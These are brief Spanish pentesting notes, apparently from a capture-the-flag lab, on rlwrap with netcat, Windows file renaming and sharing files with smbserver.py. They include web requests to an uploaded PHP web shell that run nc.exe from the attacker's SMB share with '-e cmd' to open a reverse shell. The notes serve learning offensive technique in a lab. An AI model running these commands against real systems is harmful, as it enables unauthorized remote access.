
# rlwrap nc

Como añadir rlwrap a netcat para aplicar una shell interactiva.



## Cambiar el nombre a un Archivo en Windows
    
Para cambiar el nombre de archivo2.txt por archivo3.txt, se puede usar el comando REN (o RENAME) escribiendo:

    REN archivo2.txt archivo3.txt 
    

---

# Crear recurso compartido con Smbserver:


    smbserver.py smbFolder $(pwd) -smb2support
    
    
De esta forma crearemos un recurso compartido a nivel de red que al cual podremos acceder desde cualquier navegador y pudiendo ver y compartir
archivos.

Para acceder a este recurso compartido simplemente escribimos nuestra Ip en el navegador seguido del nombre que le hemos dado a la carpeta compartida,
en este caso ``smbFolder``.

``Ejemplos``:

Mostrar con dir los recursos compartidos:
  
    http://10.10.10.198:8080/upload/kamehameha.php?telepathy=dir \\10.10.14.75\smbFolder\
    

Ejecutar nc.exe a través del navegador, tendremos que especificar una dirección y un puerto de escucha:

    http://10.10.10.198:8080/upload/kamehameha.php?telepathy=\\10.10.14.75\smbFolder\nc.exe -e cmd [Ip Atacante] [Puerto en Escucha]
    
    

    
